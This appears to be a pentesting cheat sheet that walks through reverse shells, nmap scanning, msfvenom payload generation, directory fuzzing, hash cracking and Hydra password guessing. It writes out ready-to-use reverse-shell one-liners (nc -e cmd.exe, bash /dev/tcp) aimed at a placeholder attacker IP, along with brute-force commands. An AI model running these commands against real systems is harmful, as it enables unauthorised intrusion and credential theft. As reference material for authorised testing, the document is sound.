# Pentesting Tools

## 0. How to Obtain a *Reverse Shell*
First, run the following command on your attacker machine to listen for the reverse shell:

```bash
nc -lvnp {attacker port}
```

This listens on the specified port and waits for the target machine to connect back.

This listens on the specified port and waits for the target machine to connect back.

- Windows
	1. Download nc.exe to the target machine.
	2. Execute:

```cmd
./nc.exe {attacker ip} {attacker port} -e cmd.exe
```

- Linux
	1. Execute:
```bash
bash -i >& /dev/tcp/{attacker ip}/{attacker port} 0>&1	
```

Once you have the reverse shell, to make it fully interactive, run:

```bash
script /dev/null -c bash
stty raw -echo; fg
reset xterm
export TERM=xterm
```

These commands are Linux/Unix-specific and should not be applied to a Windows cmd.exe reverse shell.

Now you can interact with a fully functional tty.

---

## 1. *arp-scan*

The *arp-scan* is used to scan the network (usually local) to discover the target machine's IP.
Common command:
```
arp-scan -I {iface} --localnet
```

- **iface** is the network interface to scan.

---

## 2. *Nmap*
*Nmap* is a versatile tool for port scanning. Some of the most useful scans:
### 2.1. Port Enumeration
First scan to list open ports (you can use extractPorts to copy them easily):
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {@victimIP} -oG allPorts
```

Parameters explained:

1. **-p-** → scan all ports
2. **--open** → show only open ports
3. **sS** → stealth SYN scan (which is stealthy because it doesn't do the 3-way handshake)
4. **--min-rate** 5000→ send at least 5000 packets/sec
5. **-vvv** → verbose output
6. **-n** → skip DNS resolution for more velocity
7. **-Pn** → skip host discovery with ping
8. **-oG allPorts**→ save output in greppable format in the file that we specifie (on this case *allPorts*)

Use extractPorts to filter relevant ports (extractPorts is a utility included with Kali Linux that copies the ports to the clipboard):

```bash
extractPorts allPorts
```

### 2.2. Detailed Port Scan
After obtaining the list of ports, perform a more thorough scan:

```bash
nmap -sCV -p{copied ports} {@victimIP} -oN targeted
```

Parameters:

1. **-sCV** → the *sC* parameter executes all the *nmap* default NSE scripts, and the *sV* parameters shows also the version detection.
2. **-p** → specify ports
3. **-oN targeted** → save in normal format for easy reading (on this case to *targeted*)


You now have two files: `allPorts` (greppable output) and `targeted` (full scan output), which you can review whenever needed. Note that `cat` is aliased to `bat`, a more powerful alternative with syntax highlighting support. We are also using the `-l ruby` option to display the output more clearly.

```bash
cat -l ruby targeted
```

---

## 3. Searchsploit
Useful for finding known vulnerabilities in services:

```bash
searchsploits {version & service}
```

Always complement with online searches (GitHub, Exploit-DB).

---

## 4. Msfvenom
This tool is used to generate custom payloads for a wide variety of operating systems and architectures. To do this, the first thing to do is list the payloads and filter them using *grep* with keywords. The command to list payloads is as follows:

```bash
msfvenom -l payloads
```

Once we have found the payload that interests us, to save it on our machine we must execute the following command

```bash
msfvenom -p {payload} LHOST={@attacker ip} LPORT={listener port} -f {filetype} -o {filename.extension}
```

---

## 5. Nessus
Another tool for scanning and reporting vulnerabilities is Nessus. Nessus exposes its web interface on TCP port 8834 by default (localhost) with the HTTPS service. To use it, you must first start the service using

```bash
systemctl start nessusd.service
```

Once it's running, we need to access https://localhost:8834 using a web browser. Once inside Nessus, to start a new scan, press the "New Scan" button in the upper right corner. This will redirect you to a page with a wide selection of possible scans. The most commonly used ones are:

- Advanced Scan → Customizable vulnerability scan.
- Host Discovery → Focuses on discovering live hosts rather than performing a full vulnerability assessment.

---

## 6. Burpsuite
Burp Suite is an intercepting proxy used to inspect and modify HTTP/HTTPS traffic between a client and a web server.

On Kali Linux, it can be launched from the application menu, from a terminal with:

```bash
burpsuite
```

The exact application launcher or keyboard shortcut depends on your local Kali configuration.

---

## 7. Gobuster
Gobuster is a tool used for directory and file enumeration, among other types of enumeration.

A common directory-enumeration command is:

```bash
gobuster dir -w {dictionary} -u {URL} -t {number of threads} -x {extensions}
```

- Dictionary → Dictionary to be used for fuzzing. The most common are:
	- */usr/share/wordlists/dirb/common.txt*
	- */usr/share/wordlsists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt*
- URL → The URL on which the attack will be carried out. For example, `http://{victim IP}`
- Number of threads → Number of threads used in the attack (to make it faster). For example, 20
- Extensions → The extensions directories can have `html, php, txt, php.bak`. For this, it's best to use the SecLists dictionary.

---

## 8. Hash-identifier + John The Ripper
These tools can be used together when working with password hashes.

hash-identifier attempts to identify the likely hash algorithm based on the hash representation.

John the Ripper can then attempt to recover the original password using techniques such as dictionary attacks.

Example:

```bash
hash-identifier
```

John example:

```bash
john --format={hash format} --wordlist={dictionary} {file with the hash}
```

A commonly used wordlist is `/usr/share/wordlists/rockyou.txt`
```

Hashes are not encrypted data, so they are not "decrypted". Password-cracking tools attempt to recover the original password or another matching input.

---

## 9. Hydra
Hydra is a tool for performing online password-guessing attacks against various network services.

For example, when testing an FTP service:

```bash
hydra -l {user} -P {dictionary} ftp://{victim IP}
```

Using a username wordlist and a known password:

```bash
hydra -L {dictionary} -p {password} ftp://{victim IP}
```

Using both username and password wordlists:

```bash
hydra -L {user dictionary} -P {password dictionary} ftp://{victim IP}
```

The exact syntax depends on the protocol and authentication mechanism being tested. HTTP authentication, SSH, FTP, etc. may require different options.

---

# 10. Wfuzz
Wfuzz can be used to fuzz HTTP requests, including the `Host` header to test for virtual hosts.
```bash
wfuzz -c --nc 400 -t 200 -w <dictionary> -v <domain> -H "HOST: FUZZ.<domain>"
```

Here, `FUZZ` is replaced with each entry from the wordlist.

This can be used to identify virtual hosts configured on a web server. It should not be confused with DNS enumeration: discovering a virtual host does not necessarily mean that a corresponding public DNS record exists.
---

# 11. Base64

Base64 is an encoding scheme, not encryption.

To decode base64 strings, run the following command:

```bash
echo "base64_string" | base64 --decode
```

To encode in base64, execute the following:

```bash
echo "text" | base64
```

---

# 12. WhatWeb
WhatWeb is an open-source tool designed to identify technologies used by websites.

It can identify technologies such as web servers, CMSs, JavaScript frameworks and other application components, depending on the information exposed by the target.

Example:

```bash
whatweb http://example.com
```